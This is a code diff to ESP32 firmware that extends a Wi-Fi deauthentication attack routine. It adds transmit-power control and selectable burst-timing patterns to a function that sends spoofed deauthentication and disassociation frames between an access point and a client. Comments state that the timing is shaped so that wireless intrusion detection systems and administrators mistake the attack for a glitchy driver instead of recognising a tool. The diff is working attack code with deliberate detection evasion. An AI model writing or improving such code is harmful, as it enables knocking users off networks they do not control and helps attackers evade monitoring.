@@ -17,6 +17,10 @@
 namespace WSLBypasser {
 
 bool initialized = false;
+// Burst shaping for sendBidirectionalKick (BURST radio knob). Read by
+// burstLegGap()/burstRoundGap() below; set at capture start via
+// setBurstPattern().
+static uint8_t s_burstPattern = 1;    // 1=RANDOM is the legacy default
 
 void init() {
     if (initialized) return;
@@ -25,6 +29,44 @@ void init() {
     Serial.println("[WSL] Frame validation bypass active (-zmuldefs)");
     initialized = true;
 }
+
+void setTxPowerDb(int8_t dbm) {
+    if (dbm < 1) dbm = 1;
+    if (dbm > 20) dbm = 20;
+    // ESP-IDF/Arduino indexes power in 0.25 dBm units, so 20 dBm -> "80".
+    esp_wifi_set_max_tx_power((int8_t)(dbm * 4));
+}
+
+void setBurstPattern(uint8_t pattern) {
+    if (pattern > 3) pattern = 1;
+    s_burstPattern = pattern;
+}
+
+// Gap between the four frames of one kick round, shaped by the BURST radio
+// knob. A WIDS or sharp admin will see four identical frames at zero
+// spacing as a tool signature; RANDOM/CLUSTER keep the burst inside a
+// 'looks like a glitchy driver' envelope instead.
+static uint16_t burstLegGap() {
+    switch (s_burstPattern) {
+        case 0:  return 1;                            // STRAIGHT: tight
+        case 2:  return 1;                            // CLUSTER: tight within burst
+        case 3:  return 40;                           // PULSE: steady rhythm
+        default: return (uint16_t)(1 + (esp_random() % 3)); // RANDOM: 1..3 ms
+    }
+}
+
+// Gap between kick rounds.
+static uint16_t burstRoundGap() {
+    switch (s_burstPattern) {
+        case 0:  return 2;                            // STRAIGHT
+        case 2:  return (uint16_t)(190 + (esp_random() % 40)); // CLUSTER: long rest
+        case 3:  return 40;                           // PULSE
+        default: return (uint16_t)(2 + (esp_random() % 4));   // RANDOM: 2..5 ms
+    }
+}
+
+uint16_t burstLegGapMs()   { return burstLegGap(); }
+uint16_t burstRoundGapMs() { return burstRoundGap(); }
 
 void randomizeMAC() {
     uint8_t mac[6];
@@ -256,26 +298,27 @@ void sendBidirectionalKick(const uint8_t* bssid, const uint8_t* client, uint8_t 
     memcpy(cl2ap + 10, client, 6);
     memcpy(cl2ap + 16, bssid, 6);
     cl2ap[24] = reason;
-    // Porkchop-style jitter: a WIDS or sharp admin will see four identical
-    // frames at zero spacing as a tool signature. Spacing them by 1-3 ms
-    // (random per leg and per round) puts the burst inside the
-    // 'looks like a glitchy driver' envelope instead. delay() blocks the
-    // calling task for the given ms; we're on the main loop (not in the
-    // WiFi promiscuous callback) so this is safe.
+    // Burst shaping (BURST radio knob): STRAIGHT = tight & predictable,
+    // RANDOM = legacy anti-WIDS jitter (default), CLUSTER = the whole burst
+    // together then a long rest, PULSE = steady rhythm. A WIDS or sharp
+    // admin will see four identical frames at zero spacing as a tool
+    // signature; RANDOM/CLUSTER keep the burst inside a 'looks like a
+    // glitchy driver' envelope. delay() blocks the calling task - we're on
+    // the main loop (not in the WiFi promiscuous callback) so this is safe.
     for (uint8_t i = 0; i < rounds; i++) {
         ap2cl[0] = 0xC0;
         rawTx(ap2cl, 26);
-        delay(1 + (esp_random() % 3));            // 1..3 ms AP->Client spacing
+        delay(burstLegGap());
         cl2ap[0] = 0xC0;
         rawTx(cl2ap, 26);
-        delay(1 + (esp_random() % 3));            // 1..3 ms Client->AP spacing
+        delay(burstLegGap());
         ap2cl[0] = 0xA0;
         rawTx(ap2cl, 26);
-        delay(1 + (esp_random() % 3));            // 1..3 ms before disassoc
+        delay(burstLegGap());
         cl2ap[0] = 0xA0;
         rawTx(cl2ap, 26);
         if (i + 1 < rounds) {
-            delay(2 + (esp_random() % 4));        // 2..5 ms between rounds
+            delay(burstRoundGap());
         }
     }
 }
